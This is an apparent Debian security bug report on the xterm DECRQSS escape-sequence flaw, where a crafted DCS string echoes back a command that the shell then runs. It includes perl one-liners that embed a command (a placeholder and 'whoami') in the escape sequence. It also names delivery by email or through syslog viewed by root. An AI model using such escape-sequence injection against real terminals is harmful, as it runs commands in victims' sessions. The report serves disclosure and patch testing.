<html><head><title>Debian GNU/Linux XTERM (DECRQSS/comments) Weakness Vulnerability</title></head><pre>Package: xterm
Version: 222-1etch2
Severity: grave
Tags: security patch
Justification: user security hole


DECRQSS Device Control Request Status String &quot;DCS $ q&quot; simply echoes
(responds with) invalid commands. For example,
perl -e 'print &quot;\eP\$q\nbad-command\n\e\\&quot;'
would run bad-command.

Exploitability is the same as for the &quot;window title reporting&quot; issue
in DSA-380: include the DCS string in an email message to the victim,
or arrange to have it in syslog to be viewed by root.

Test:

perl -e 'print &quot;\eP\$q\nwhoami\n\e\\&quot;' &gt; bla.log
cat bla.log

If whoami gets executed you should update.
